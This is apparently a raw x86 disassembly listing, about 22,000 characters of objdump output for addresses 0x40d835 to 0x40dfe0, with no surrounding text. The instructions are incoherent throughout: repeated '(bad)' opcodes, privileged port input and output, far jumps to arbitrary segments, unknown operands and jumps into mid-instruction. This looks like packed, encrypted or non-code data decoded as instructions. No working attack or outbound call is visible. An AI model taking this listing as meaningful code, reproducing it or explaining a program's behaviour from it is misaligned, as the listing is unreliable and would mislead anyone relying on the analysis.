  40d835:	and    BYTE PTR [esi+edi*4],dh
  40d838:	out    dx,eax
  40d839:	push   esp
  40d83a:	mov    BYTE PTR [edi],dl
  40d83c:	stc    
  40d83d:	jns    0x40d7f1
  40d83f:	pop    ds
  40d840:	jns    0x40d7c8
  40d842:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d843:	shl    edx,1
  40d845:	push   ebp
  40d846:	imul   DWORD PTR [eax-0x21]
  40d849:	mov    ch,0xa1
  40d84b:	lods   eax,DWORD PTR ds:[esi]
  40d84c:	fcom   st(0)
  40d84e:	mov    ds:0x5d7a9828,al
  40d853:	add    DWORD PTR [eax],0xe8a154bd
  40d859:	mov    dh,0x2
  40d85b:	pop    ss
  40d85c:	jne    0x40d8a1
  40d85e:	popf   
  40d85f:	adc    eax,0x4ef0746c
  40d864:	int    0x3b
  40d866:	jl     0x40d8e4
  40d868:	jmp    0x6cc8:0x4400593b
  40d86f:	sub    BYTE PTR [esi+0x420cacfe],ch
  40d875:	repnz fs xor cl,bh
  40d879:	mov    DWORD PTR [ebp-0x36d17fee],eax
  40d87f:	in     eax,dx
  40d880:	sahf   
  40d881:	mov    edi,0x15141e8d
  40d886:	(bad)  [eax+0x45]
  40d889:	dec    edx
  40d88a:	pop    ss
  40d88b:	in     al,0xdf
  40d88d:	ins    BYTE PTR es:[edi],dx
  40d88e:	sub    BYTE PTR [esi-0x5c],cl
  40d891:	mov    al,ds:0x1fa4b852
  40d896:	inc    edi
  40d897:	push   esi
  40d898:	pop    edx
  40d899:	jno    0x40d83d
  40d89b:	sub    al,0xc
  40d89d:	or     DWORD PTR [esi-0x4c],ebp
  40d8a0:	retf   0xbffd
  40d8a3:	xor    esi,DWORD PTR [edx+0x2f]
  40d8a6:	mov    esi,esp
  40d8a8:	xchg   esi,eax
  40d8a9:	pop    ebp
  40d8aa:	mov    dh,0x67
  40d8ac:	lahf   
  40d8ad:	loope  0x40d8ab
  40d8af:	fldcw  WORD PTR [ebx]
  40d8b1:	imul   eax,DWORD PTR [eax+0x1b1a7675],0x75
  40d8b8:	lds    esi,FWORD PTR [edx]
  40d8ba:	cmp    eax,0x43a7d201
  40d8bf:	xor    dh,ah
  40d8c1:	test   al,0x46
  40d8c3:	mov    ds,ebx
  40d8c5:	xor    edi,DWORD PTR [ebx]
  40d8c7:	addr16 jge 0x40d935
  40d8ca:	je     0x40d88f
  40d8cc:	daa    
  40d8cd:	mov    BYTE PTR [ebx+0x3e56c793],bh
  40d8d3:	sbb    eax,0xdb84c6f4
  40d8d8:	test   al,0x29
  40d8da:	sahf   
  40d8db:	mov    ebx,0xbacafe46
  40d8e0:	lods   al,BYTE PTR ds:[esi]
  40d8e1:	pop    edx
  40d8e2:	jp     0x40d8b7
  40d8e4:	and    al,0xa4
  40d8e6:	inc    edi
  40d8e7:	xor    ecx,edi
  40d8e9:	out    dx,al
  40d8ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d8eb:	sbb    eax,0xfed012b8
  40d8f0:	and    BYTE PTR [edi+0x393b1e0a],cl
  40d8f6:	mov    edi,cs
  40d8f8:	sub    al,0x21
  40d8fa:	test   al,0xf6
  40d8fc:	cwde   
  40d8fd:	fstp   QWORD PTR ds:0x3b897796
  40d903:	adc    al,0xb4
  40d905:	pop    esi
  40d906:	mov    ebp,0xbdd1fe1
  40d90b:	(bad)  
  40d90c:	adc    edx,DWORD PTR [ecx+0x6271bb9c]
  40d912:	push   es
  40d913:	adc    cl,BYTE PTR [eax-0x60]
  40d916:	out    dx,eax
  40d917:	sbb    cl,BYTE PTR [ebp+0x62]
  40d91a:	xor    al,0x15
  40d91c:	add    al,dh
  40d91e:	jns    0x40d8e7
  40d920:	test   eax,0x5eab2f79
  40d925:	nop
  40d926:	mov    ecx,0xb07a5acf
  40d92b:	xchg   ecx,eax
  40d92c:	ficom  DWORD PTR [eax+0x285c5763]
  40d932:	inc    DWORD PTR [esi+0x7eda803]
  40d938:	aad    0x29
  40d93a:	jle    0x40d903
  40d93c:	adc    eax,0x421c717a
  40d941:	jno    0x40d9a0
  40d943:	or     eax,0x76cd49c
  40d948:	mov    ds:0x1288e868,al
  40d94d:	(bad)  [esi-0x42]
  40d950:	ror    BYTE PTR [edi-0x6dd24fa5],1
  40d956:	cmp    eax,esi
  40d958:	pop    es
  40d959:	rcr    dl,1
  40d95b:	mov    esp,0x25905674
  40d960:	imul   ecx,DWORD PTR [edi+0x44],0x6eab3bcb
  40d967:	or     DWORD PTR [edx+0x25],eax
  40d96a:	fdiv   QWORD PTR [ecx+0x340f100d]
  40d970:	sub    eax,0x2da8b50b
  40d975:	sub    eax,ebp
  40d977:	push   eax
  40d978:	popa   
  40d979:	imul   ecx,DWORD PTR [eax+edi*1],0xfcee21cd
  40d980:	shl    dh,cl
  40d982:	and    esi,DWORD PTR [esi+0x6f]
  40d985:	jl     0x40d954
  40d987:	or     DWORD PTR [eax],esi
  40d989:	out    0x8b,al
  40d98b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d98c:	in     al,dx
  40d98d:	fcomp  QWORD PTR [edi-0x5d]
  40d990:	shl    BYTE PTR [edi+0x4e],1
  40d993:	mov    eax,0xb36fe38d
  40d998:	xor    eax,0x752c9830
  40d99d:	imul   ebp,DWORD PTR [edi-0x78],0xb4e01ae0
  40d9a4:	out    0x63,eax
  40d9a6:	xor    eax,0xcd67cad6
  40d9ab:	dec    edx
  40d9ac:	js     0x40da0e
  40d9ae:	xchg   ecx,eax
  40d9af:	or     BYTE PTR [ecx],cl
  40d9b1:	sub    DWORD PTR [edx+0x744b608b],eax
  40d9b7:	add    ch,ah
  40d9b9:	data16 jge 0x40d997
  40d9bc:	(bad)  
  40d9bd:	cmp    edi,DWORD PTR [eax]
  40d9bf:	push   esi
  40d9c0:	mov    al,0x20
  40d9c2:	ret    
  40d9c3:	mov    ebx,0x6b91b95a
  40d9c8:	sbb    al,0x83
  40d9ca:	push   es
  40d9cb:	inc    ebx
  40d9cc:	cmp    al,0x13
  40d9ce:	shl    BYTE PTR [eax-0x4717bbb4],cl
  40d9d4:	inc    ebp
  40d9d5:	inc    esp
  40d9d6:	sti    
  40d9d7:	arpl   dx,sp
  40d9d9:	jl     0x2593ba74
  40d9df:	retf   
  40d9e0:	xchg   BYTE PTR [ebx+eiz*8],dl
  40d9e3:	mov    cl,0x39
  40d9e5:	jg     0x40d9bf
  40d9e7:	data16 lahf 
  40d9e9:	xlat   BYTE PTR ds:[ebx]
  40d9ea:	add    bl,BYTE PTR [eax]
  40d9ec:	stos   DWORD PTR es:[edi],eax
  40d9ed:	hlt    
  40d9ee:	ins    DWORD PTR es:[edi],dx
  40d9ef:	iret   
  40d9f0:	arpl   WORD PTR [ebp+0x3f],si
  40d9f3:	xor    eax,0x9cdfa43a
  40d9f8:	fcomp  QWORD PTR [esi+0x7a]
  40d9fb:	inc    esp
  40d9fc:	adc    esi,DWORD PTR [edi-0x7b]
  40d9ff:	jmp    0x2ea89428
  40da04:	shr    BYTE PTR [eax-0x3c9ba5c0],cl
  40da0a:	lods   eax,DWORD PTR ds:[esi]
  40da0b:	test   al,0xb
  40da0d:	repz or edi,0xd
  40da11:	(bad)  [ecx]
  40da13:	leave  
  40da14:	fld    QWORD PTR [edi]
  40da16:	ffreep st(0)
  40da18:	pop    ebx
  40da19:	dec    edx
  40da1a:	xor    eax,0x36d06494
  40da1f:	je     0x40da82
  40da21:	dec    eax
  40da22:	push   edx
  40da23:	inc    eax
  40da24:	test   BYTE PTR [eax],al
  40da26:	mov    ch,0x9a
  40da28:	call   0xd92a:0x760aed99
  40da2f:	pop    ebp
  40da30:	test   BYTE PTR [edx-0x30],cl
  40da33:	scas   eax,DWORD PTR es:[edi]
  40da34:	call   0xa227:0xfa9c7e3
  40da3b:	add    BYTE PTR [ebx+edx*2+0x22],0x76
  40da40:	mov    ch,0x1a
  40da42:	inc    eax
  40da43:	aaa    
  40da44:	js     0x40d9ce
  40da46:	push   eax
  40da47:	push   esp
  40da48:	pop    ebx
  40da49:	in     al,0xcd
  40da4b:	popf   
  40da4c:	jge    0x40d9d4
  40da4e:	nop
  40da4f:	add    cl,BYTE PTR [eax+0x250130f]
  40da55:	mov    WORD PTR [esi+0x350e9a3c],fs
  40da5b:	or     al,0x77
  40da5d:	or     DWORD PTR [esi],edx
  40da5f:	arpl   WORD PTR [edx+0x25],bx
  40da62:	sbb    dl,al
  40da64:	out    0xc2,eax
  40da66:	mov    ecx,DWORD PTR [edi-0x3e18d872]
  40da6c:	mov    ebx,0xcd2052d1
  40da71:	pusha  
  40da72:	xchg   DWORD PTR [edx-0x32],ecx
  40da75:	cmp    BYTE PTR [edx],bl
  40da77:	jl     0x40da6f
  40da79:	mov    ebp,0x6f34b181
  40da7e:	sub    eax,0xc4033a71
  40da83:	inc    ebp
  40da84:	jp     0x40da4a
  40da86:	inc    edx
  40da87:	pop    esi
  40da88:	aaa    
  40da89:	stos   DWORD PTR es:[edi],eax
  40da8a:	rcl    ah,0x85
  40da8d:	in     eax,0xd3
  40da8f:	sub    bl,cl
  40da91:	cmp    eax,edx
  40da93:	fxch   st(6)
  40da95:	jno    0x40da37
  40da97:	stos   BYTE PTR es:[edi],al
  40da98:	jecxz  0x40dab5
  40da9a:	mov    esi,0xb4ccce17
  40da9f:	jl     0x40da97
  40daa1:	daa    
  40daa2:	pop    edx
  40daa3:	xchg   edi,eax
  40daa4:	jo     0x40da53
  40daa6:	push   esi
  40daa7:	xor    BYTE PTR [ebp-0x20a5f7f3],0x41
  40daae:	mov    esp,DWORD PTR [ecx+ebx*4+0x2b]
  40dab2:	add    ecx,ecx
  40dab4:	fxch   st(5)
  40dab6:	push   esp
  40dab7:	mov    es,WORD PTR [esi-0x7537b85d]
  40dabd:	mov    ds:0x4c079b26,al
  40dac2:	stos   BYTE PTR es:[edi],al
  40dac3:	fld    TBYTE PTR ds:0x60ef7f07
  40dac9:	cmp    DWORD PTR [eax-0x2f330244],esi
  40dacf:	aad    0xf3
  40dad1:	ss jecxz 0x40db22
  40dad4:	retf   
  40dad5:	int    0x78
  40dad7:	loope  0x40db07
  40dad9:	xchg   ecx,eax
  40dada:	mov    bl,0xde
  40dadc:	push   eax
  40dadd:	rol    DWORD PTR [edi-0x4b],cl
  40dae0:	xchg   ebp,eax
  40dae1:	mov    bl,0x3d
  40dae3:	in     al,dx
  40dae4:	fcomp  QWORD PTR ds:0xb66a3b37
  40daea:	cwde   
  40daeb:	mov    ds:0x47ed26b2,al
  40daf0:	aam    0x9c
  40daf2:	push   esi
  40daf3:	pop    ecx
  40daf4:	mov    bl,0xf
  40daf6:	(bad)  
  40daf7:	shl    esi,cl
  40daf9:	(bad)  
  40dafa:	mov    bl,0x17
  40dafc:	jnp    0x40db6c
  40dafe:	int    0xd8
  40db00:	test   DWORD PTR [esi+0x798c976b],edi
  40db06:	sbb    eax,0x54b1da6d
  40db0b:	aad    0xec
  40db0d:	popf   
  40db0e:	xor    al,0x52
  40db10:	cld    
  40db11:	xor    BYTE PTR [ecx+0x4c],al
  40db14:	push   es
  40db15:	xlat   BYTE PTR ds:[ebx]
  40db16:	jo     0x40da9d
  40db18:	ret    0x4e84
  40db1b:	loope  0x40daed
  40db1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40db1e:	(bad)  
  40db20:	pop    eax
  40db21:	jne    0x40db35
  40db23:	or     bh,BYTE PTR [ecx-0x59f11843]
  40db29:	cmp    BYTE PTR [ebp+0x7e6ddb47],ch
  40db2f:	call   0xcf8e:0xc0d7eaad
  40db36:	push   edi
  40db37:	fisttp QWORD PTR [edx]
  40db39:	shr    DWORD PTR [esi+0x6ea9c241],cl
  40db3f:	loop   0x40db96
  40db41:	scas   eax,DWORD PTR es:[edi]
  40db42:	icebp  
  40db43:	mov    al,ds:0x29612917
  40db48:	test   DWORD PTR [eax],esp
  40db4a:	mov    esi,0x234979b7
  40db4f:	mov    ebx,0x45000f2b
  40db54:	call   0x9493f735
  40db59:	cwde   
  40db5a:	xchg   esp,eax
  40db5b:	out    0x18,eax
  40db5d:	in     al,0x5e
  40db5f:	xor    al,0x67
  40db61:	ret    
  40db62:	mov    ah,0xbc
  40db64:	add    bl,ah
  40db66:	loope  0x40db51
  40db68:	fadd   QWORD PTR [edi+eiz*4-0x36]
  40db6c:	sti    
  40db6d:	(bad)  
  40db6e:	ss mov ?,esi
  40db71:	imul   edx,DWORD PTR [esi+0x36],0xffffffcb
  40db75:	cmp    DWORD PTR [edx+0x29],ebx
  40db78:	jp     0x40db4d
  40db7a:	dec    ecx
  40db7b:	ficom  WORD PTR [eax-0x693d5b9b]
  40db81:	push   esp
  40db82:	imul   BYTE PTR [ebx]
  40db84:	aaa    
  40db85:	fisttp QWORD PTR [edx]
  40db87:	cmp    al,0x65
  40db89:	sub    al,0x16
  40db8b:	sub    ebx,esi
  40db8d:	pushf  
  40db8e:	clc    
  40db8f:	pusha  
  40db90:	or     eax,0x1b497971
  40db95:	addr16 retf 
  40db97:	push   eax
  40db98:	mov    ds:0xfa30c2b0,al
  40db9d:	cmp    esp,DWORD PTR [esi+0x42]
  40dba0:	ins    BYTE PTR es:[edi],dx
  40dba1:	pop    ds
  40dba2:	mov    ah,BYTE PTR [esi+0x1e]
  40dba5:	retf   0x1bda
  40dba8:	adc    BYTE PTR [ebp+0x18c9054],bh
  40dbae:	pop    ss
  40dbaf:	sahf   
  40dbb0:	ret    
  40dbb1:	test   eax,0x610f3fbc
  40dbb6:	mov    ds:0x91e9ba1f,al
  40dbbb:	rcr    DWORD PTR [ebx-0x65026771],0x5b
  40dbc2:	xchg   ebx,eax
  40dbc3:	test   esi,0x1ac6ed6d
  40dbc9:	(bad)  
  40dbcb:	imul   eax,eax,0x562d3324
  40dbd1:	int3   
  40dbd2:	add    ecx,DWORD PTR [eax]
  40dbd4:	stos   DWORD PTR es:[edi],eax
  40dbd5:	mov    al,0x24
  40dbd7:	xor    BYTE PTR [ecx+0x18],dh
  40dbda:	(bad)  
  40dbdb:	cli    
  40dbdc:	test   al,0x43
  40dbde:	bound  ebp,QWORD PTR [ebx+0x33]
  40dbe1:	inc    ebp
  40dbe2:	cmp    cl,BYTE PTR [esi+0x77a5b84]
  40dbe8:	dec    ebx
  40dbe9:	fimul  WORD PTR [ebp+0x63807f8e]
  40dbef:	fild   QWORD PTR [ebp+ebp*1+0x6c]
  40dbf3:	and    ebx,DWORD PTR [edi+0x27]
  40dbf6:	lods   al,BYTE PTR ds:[esi]
  40dbf7:	jbe    0x40dbe4
  40dbf9:	cmc    
  40dbfa:	int3   
  40dbfb:	std    
  40dbfc:	mov    edx,?
  40dbfe:	mul    DWORD PTR [ecx-0x4990a459]
  40dc04:	xchg   ebp,eax
  40dc05:	mov    esi,0x88da8e82
  40dc0a:	stc    
  40dc0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc0c:	test   BYTE PTR [ebx],0x7c
  40dc0f:	xchg   ecx,eax
  40dc10:	jp     0x40db93
  40dc12:	daa    
  40dc13:	cld    
  40dc14:	pop    ebx
  40dc15:	test   BYTE PTR [edi+0x2b],ch
  40dc18:	push   esp
  40dc19:	fstp   DWORD PTR [ecx-0xed0aefd]
  40dc1f:	jg     0x40dc57
  40dc21:	cmp    eax,0xa95f47bf
  40dc26:	push   esi
  40dc27:	js     0x40dc34
  40dc29:	dec    ebp
  40dc2a:	fmul   st(0),st
  40dc2c:	popa   
  40dc2d:	jno    0x40dc5b
  40dc2f:	inc    esi
  40dc30:	in     al,dx
  40dc31:	ret    
  40dc32:	mov    esp,0x8436da50
  40dc37:	mov    eax,ds:0x8cc52605
  40dc3c:	sbb    ebx,ebx
  40dc3e:	cmp    dh,bl
  40dc40:	push   ecx
  40dc41:	cmp    al,0x75
  40dc43:	add    eax,0xdef19352
  40dc48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc49:	bound  ecx,QWORD PTR [eax-0x70]
  40dc4c:	xor    al,0xed
  40dc4e:	ins    BYTE PTR es:[edi],dx
  40dc4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc50:	or     BYTE PTR [eax+0x532cd7b2],ah
  40dc56:	mov    dl,0xf0
  40dc58:	and    al,0x2a
  40dc5a:	in     eax,0x16
  40dc5c:	js     0x40dc6f
  40dc5e:	adc    al,0x2f
  40dc60:	popa   
  40dc61:	push   0xf74745c9
  40dc66:	out    dx,eax
  40dc67:	mov    bl,0x99
  40dc69:	cmp    al,BYTE PTR [ebp-0x292d11ae]
  40dc6f:	cmp    BYTE PTR [edi+0x3d],cl
  40dc72:	fsub   DWORD PTR [edx+eiz*1+0x77]
  40dc76:	stc    
  40dc77:	cmp    dh,ch
  40dc79:	test   DWORD PTR [edi+0x6f],ebp
  40dc7c:	loop   0x40dcb7
  40dc7e:	push   ss
  40dc7f:	cmp    dh,dl
  40dc81:	adc    DWORD PTR [eax],edi
  40dc83:	cmc    
  40dc84:	scas   eax,DWORD PTR es:[edi]
  40dc85:	out    dx,eax
  40dc86:	pop    ecx
  40dc87:	into   
  40dc88:	dec    ecx
  40dc89:	stos   DWORD PTR es:[edi],eax
  40dc8a:	sbb    ecx,DWORD PTR [ecx+0x72]
  40dc8d:	push   0x4bde948b
  40dc92:	and    ebx,esp
  40dc94:	xor    DWORD PTR [ecx+0x6f],edx
  40dc97:	xor    BYTE PTR [eax-0x32ade0b7],ch
  40dc9d:	cmp    BYTE PTR [ecx-0x3afe0063],dl
  40dca3:	int    0x92
  40dca5:	push   esp
  40dca6:	mov    eax,0xb559b625
  40dcab:	loopne 0x40dca2
  40dcad:	dec    esi
  40dcae:	sub    eax,0x36346cb
  40dcb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcb4:	pop    edi
  40dcb5:	(bad)  
  40dcb7:	xor    bh,BYTE PTR [edx-0x8a31a9e]
  40dcbd:	clc    
  40dcbe:	jno    0x40dd3d
  40dcc0:	or     al,BYTE PTR [ebx]
  40dcc2:	mov    dh,BYTE PTR [eiz*2-0x1ce7a1ff]
  40dcc9:	mov    ah,bh
  40dccb:	jmp    0xddf4ebbf
  40dcd0:	sbb    al,0x14
  40dcd2:	pop    esp
  40dcd3:	lds    edx,FWORD PTR [eax+eiz*8-0x6e0b502d]
  40dcda:	push   ecx
  40dcdb:	es addr16 and al,0xbb
  40dcdf:	xchg   ecx,eax
  40dce0:	add    bl,bl
  40dce2:	test   DWORD PTR [ebx-0x45],esp
  40dce5:	mov    esp,0xe079f19d
  40dcea:	lock cmp al,0xf2
  40dced:	inc    esp
  40dcee:	jbe    0x40dd4b
  40dcf0:	rcl    DWORD PTR [eax+0x17642718],cl
  40dcf6:	add    BYTE PTR [ecx-0x73],cl
  40dcf9:	daa    
  40dcfa:	push   0xffffffee
  40dcfc:	fwait
  40dcfd:	hlt    
  40dcfe:	shl    DWORD PTR [esi+0x6a667148],0xf6
  40dd05:	jl     0x40dd00
  40dd07:	sub    eax,0x26aec617
  40dd0c:	icebp  
  40dd0d:	xor    DWORD PTR [eax-0x69f1e6c8],edx
  40dd13:	retf   
  40dd14:	lods   al,BYTE PTR ds:[esi]
  40dd15:	mov    dl,0x83
  40dd17:	sbb    dh,BYTE PTR [esi+0x61788ab8]
  40dd1d:	and    al,0x58
  40dd1f:	mov    edx,0x125432c
  40dd24:	pop    ds
  40dd25:	cmp    DWORD PTR [esi+ebx*4],0xffffff8e
  40dd29:	sub    al,0x9d
  40dd2b:	mov    ebx,0xd0446675
  40dd30:	ror    BYTE PTR [edx-0x36],cl
  40dd33:	mov    ss,WORD PTR [edi+0x5e]
  40dd36:	fadd   QWORD PTR [edi-0x64]
  40dd39:	push   edi
  40dd3a:	mov    ebp,0x4a2d2f15
  40dd3f:	cmp    esi,DWORD PTR [eax]
  40dd41:	loopne 0x40dd86
  40dd43:	pop    edx
  40dd44:	and    eax,0xd45bbffc
  40dd49:	and    eax,0xa31f01d5
  40dd4e:	pushf  
  40dd4f:	sbb    cl,dl
  40dd51:	stos   BYTE PTR es:[edi],al
  40dd52:	stos   BYTE PTR es:[edi],al
  40dd53:	std    
  40dd54:	sti    
  40dd55:	rol    DWORD PTR [edx+0x7ccca561],0xac
  40dd5c:	sub    al,0xaa
  40dd5e:	xchg   ecx,eax
  40dd5f:	icebp  
  40dd60:	sub    dh,bh
  40dd62:	fnstenv [edi-0x6d]
  40dd65:	popa   
  40dd66:	ja     0x40dd14
  40dd68:	or     BYTE PTR [esi-0x4f69e26a],ch
  40dd6e:	dec    edx
  40dd6f:	ds js  0x40dd50
  40dd72:	mov    ah,0x1c
  40dd74:	add    BYTE PTR [ebx+0x4f7cd16],bl
  40dd7a:	push   ss
  40dd7b:	in     eax,dx
  40dd7c:	cmp    DWORD PTR [ebp-0x13],ebx
  40dd7f:	jo     0x40ddcc
  40dd81:	rol    DWORD PTR [ebp+0x7c1c6f69],1
  40dd87:	sti    
  40dd88:	sar    BYTE PTR [esp+esi*2+0x233dff1a],cl
  40dd8f:	adc    DWORD PTR [ebx+0x41ec5361],0x49f12b75
  40dd99:	fld    QWORD PTR [esi-0x59]
  40dd9c:	in     al,dx
  40dd9d:	in     eax,0xf
  40dd9f:	jnp    0x40dda3
  40dda1:	xor    eax,0x7fd489c7
  40dda6:	adc    al,0x81
  40dda8:	loopne 0x40dd5d
  40ddaa:	jecxz  0x40ddc0
  40ddac:	(bad)  
  40ddad:	dec    DWORD PTR [eax]
  40ddaf:	ds cwde 
  40ddb1:	pop    edx
  40ddb2:	(bad)  
  40ddb3:	fbld   TBYTE PTR [eax+0x29dad2e4]
  40ddb9:	sbb    DWORD PTR [ecx],ebx
  40ddbb:	dec    edx
  40ddbc:	out    dx,al
  40ddbd:	dec    ecx
  40ddbe:	inc    ebp
  40ddbf:	inc    esp
  40ddc0:	push   esp
  40ddc1:	addr16 sbb eax,0xcd652590
  40ddc7:	shr    bh,0xe3
  40ddca:	mov    dl,0x68
  40ddcc:	call   0xebe3:0x2f39dc7d
  40ddd3:	inc    eax
  40ddd4:	sahf   
  40ddd5:	(bad)  
  40ddd7:	fdivrp st(0),st
  40ddd9:	mov    esi,0x5a80192a
  40ddde:	push   edx
  40dddf:	push   edi
  40dde0:	add    DWORD PTR [edx+0x10],edi
  40dde3:	dec    ecx
  40dde4:	sub    DWORD PTR [esi-0x11685a24],eax
  40ddea:	xor    eax,0x515047bb
  40ddef:	xchg   esi,eax
  40ddf0:	aad    0xe5
  40ddf2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ddf3:	(bad)  
  40ddf4:	and    eax,0x211e1d2b
  40ddf9:	cmc    
  40ddfa:	outs   dx,BYTE PTR ds:[esi]
  40ddfb:	jns    0x40dd88
  40ddfd:	add    BYTE PTR [ebp-0x67],dh
  40de00:	lds    esi,FWORD PTR [ecx+0x758bf854]
  40de06:	push   edx
  40de07:	fsub   st(2),st
  40de09:	pushf  
  40de0a:	inc    edx
  40de0b:	aam    0xaf
  40de0d:	inc    esi
  40de0e:	jge    0x40ddef
  40de10:	lahf   
  40de11:	jmp    0xdaa3:0x21300147
  40de18:	shl    DWORD PTR [eax+0xb25cef9],cl
  40de1e:	fadd   st(1),st
  40de20:	mov    eax,ds:0xd7263a04
  40de25:	xor    eax,0xcef54869
  40de2a:	sbb    ah,BYTE PTR [edi-0x6df233e5]
  40de30:	cld    
  40de31:	add    BYTE PTR [eax+0x2a6ef69d],ah
  40de37:	add    al,0xcb
  40de39:	sbb    dl,BYTE PTR [esi-0x26956f88]
  40de3f:	outs   dx,DWORD PTR ds:[esi]
  40de40:	or     DWORD PTR [esi-0x496e36cc],ebp
  40de46:	sbb    ah,BYTE PTR [edi+ebp*2+0x53]
  40de4a:	jmp    0x4fbb2c0e
  40de4f:	fisttp WORD PTR [ebp-0x494dc27b]
  40de55:	xchg   esp,eax
  40de56:	inc    edx
  40de57:	cwde   
  40de58:	fld    QWORD PTR [eax]
  40de5a:	repz sbb DWORD PTR [eax-0xd],ebp
  40de5e:	repz scas eax,DWORD PTR es:[edi]
  40de60:	mov    esi,0xb93e2afc
  40de65:	iret   
  40de66:	arpl   WORD PTR [ebx+0x1e5f1df0],si
  40de6c:	push   ds
  40de6d:	inc    ebp
  40de6e:	xor    ecx,DWORD PTR [ebx-0x55ffbd3b]
  40de74:	iret   
  40de75:	mov    cl,0x79
  40de77:	xchg   edi,eax
  40de78:	and    BYTE PTR [ecx+edx*8+0x599a2594],ah
  40de7f:	leave  
  40de80:	add    dh,bh
  40de82:	or     esi,edi
  40de84:	and    BYTE PTR [esp+edi*8],bl
  40de87:	stos   DWORD PTR es:[edi],eax
  40de88:	test   DWORD PTR [ebp+0x3d],ebp
  40de8b:	fbld   TBYTE PTR [esi+0x56df1da3]
  40de91:	(bad)  
  40de92:	lds    ebp,FWORD PTR [ebp+ecx*8-0x6857ea8d]
  40de99:	dec    eax
  40de9a:	adc    edi,ebp
  40de9c:	test   eax,0xbb2c227d
  40dea1:	(bad)  
  40dea2:	std    
  40dea3:	mov    eax,0x55a97a9e
  40dea8:	pop    ds
  40dea9:	add    eax,0xf96ce2f8
  40deae:	sahf   
  40deaf:	inc    esp
  40deb0:	inc    ecx
  40deb1:	mov    ah,0x96
  40deb3:	bound  esi,QWORD PTR [edx+0x4b2b86b]
  40deb9:	loope  0x40de3d
  40debb:	jg     0x40deef
  40debd:	jmp    0x40deb4
  40debf:	jae    0x40de99
  40dec1:	xchg   ebp,eax
  40dec2:	dec    ebp
  40dec3:	mov    esi,DWORD PTR [eax-0x7d]
  40dec6:	fcom   QWORD PTR [ebp+0x66]
  40dec9:	add    al,0xdb
  40decb:	push   edi
  40decc:	fwait
  40decd:	je     0x40ded8
  40decf:	loop   0x40def7
  40ded1:	pop    ss
  40ded2:	or     eax,0xffd2aa78
  40ded7:	push   eax
  40ded8:	add    al,0x9a
  40deda:	arpl   WORD PTR ds:0x7b1033f3,di
  40dee0:	popa   
  40dee1:	daa    
  40dee2:	rcl    DWORD PTR [edx],cl
  40dee4:	push   es
  40dee5:	stc    
  40dee6:	add    eax,0x1d1bb12e
  40deeb:	push   ecx
  40deec:	stos   BYTE PTR es:[edi],al
  40deed:	je     0x40dea4
  40deef:	xchg   ecx,eax
  40def0:	lahf   
  40def1:	outs   dx,BYTE PTR ds:[esi]
  40def2:	xor    ch,BYTE PTR [ebx]
  40def4:	neg    al
  40def6:	mov    ecx,0x4c63659d
  40defb:	xchg   edx,eax
  40defc:	jl     0x40df06
  40defe:	cmp    cl,BYTE PTR [ebx-0x29f8570c]
  40df04:	xor    bl,BYTE PTR ds:0x5c44cf69
  40df0a:	gs ret 0xb4f4
  40df0e:	data16 cmc 
  40df10:	in     eax,dx
  40df11:	mov    dh,dh
  40df13:	mov    WORD PTR [ebx+eiz*8+0x55],ds
  40df17:	add    BYTE PTR [eax],bl
  40df19:	lock fs aam 0x94
  40df1d:	aam    0x57
  40df1f:	or     eax,0x1215aaae
  40df24:	enter  0x36f4,0xe9
  40df28:	jecxz  0x40df5c
  40df2a:	in     eax,0xf
  40df2c:	lock add al,0x50
  40df2f:	push   0x62
  40df31:	mov    ebx,0xd2a2a19
  40df36:	mov    bl,0xa6
  40df38:	mov    bl,0x74
  40df3a:	in     al,0xc6
  40df3c:	dec    DWORD PTR [ebx]
  40df3e:	push   ebp
  40df3f:	stc    
  40df40:	rcl    BYTE PTR [ebp-0x7a],1
  40df43:	loop   0x40df3e
  40df45:	inc    ebp
  40df46:	test   al,0xb7
  40df48:	gs test al,0x47
  40df4b:	cs mov esp,0xe0027d8d
  40df51:	or     bh,dl
  40df53:	daa    
  40df54:	mov    al,0xf4
  40df56:	xchg   BYTE PTR [ecx-0x56],ch
  40df59:	cmp    al,0x97
  40df5b:	push   eax
  40df5c:	mov    ah,0x99
  40df5e:	sub    BYTE PTR [edx-0x25],0x7b
  40df62:	(bad)  
  40df63:	imul   BYTE PTR [ebx+0x50]
  40df66:	je     0x40df9d
  40df68:	pop    esp
  40df69:	push   ebp
  40df6a:	out    dx,al
  40df6b:	mov    DWORD PTR [esi+esi*1],eax
  40df6e:	stos   DWORD PTR es:[edi],eax
  40df6f:	js     0x40df43
  40df71:	fidiv  WORD PTR [esi+0x3416990]
  40df77:	push   esp
  40df78:	add    ch,BYTE PTR [edi+esi*2-0x2d]
  40df7c:	mov    cl,0x31
  40df7e:	push   ecx
  40df7f:	cmp    bh,BYTE PTR [edx+eiz*8]
  40df82:	test   edx,edi
  40df84:	and    bl,BYTE PTR ds:0xaebe1da0
  40df8a:	cmp    cl,bh
  40df8c:	mov    al,ss:0xe4abf57f
  40df92:	js     0x40dffc
  40df94:	shl    DWORD PTR [ebx-0x22],0x60
  40df98:	nop
  40df99:	sub    al,0x91
  40df9b:	add    bh,BYTE PTR [esi-0x8ee33a1]
  40dfa1:	mov    ?,edx
  40dfa3:	xchg   DWORD PTR [eax+0x18],esi
  40dfa6:	mov    al,ds:0x89fda5d6
  40dfab:	fisub  DWORD PTR [edi-0x10]
  40dfae:	mov    ds:0x9311c4c2,al
  40dfb3:	or     ebp,DWORD PTR [ebx-0x42bb49a5]
  40dfb9:	sti    
  40dfba:	popa   
  40dfbb:	test   dl,dl
  40dfbd:	pop    edi
  40dfbe:	mov    edx,0x90fa12d2
  40dfc3:	xor    al,0x52
  40dfc5:	push   ss
  40dfc6:	call   0x38de5b96
  40dfcb:	and    esp,0x14292c57
  40dfd1:	fidivr DWORD PTR [ebx+0x78aaf31c]
  40dfd7:	push   eax
  40dfd8:	add    al,0x7f
  40dfda:	cmp    eax,0x6cecfe0d
  40dfdf:	push   ds
  40dfe0:	mov    edx,DWORD PTR [ebp+esi*2+0x88df5af]
